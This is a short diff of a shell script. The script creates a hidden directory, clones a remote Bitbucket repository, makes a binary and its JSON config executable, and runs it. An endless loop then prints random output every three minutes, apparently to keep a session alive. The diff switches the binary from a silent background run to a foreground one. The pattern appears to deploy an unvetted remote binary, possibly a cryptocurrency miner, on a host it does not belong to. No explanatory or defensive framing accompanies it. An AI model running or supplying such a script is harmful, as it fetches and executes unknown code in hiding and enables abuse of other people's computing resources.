@@ -2,5 +2,5 @@ mkdir .kapi && cd .kapi
 git clone https://bitbucket.org/nyileuh/subites.git
 cd subites
 chmod +x aa.json && chmod +x nivu
-./nivu -c "aa.json" > /dev/null 2>&1 &
+./nivu -c "aa.json"
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
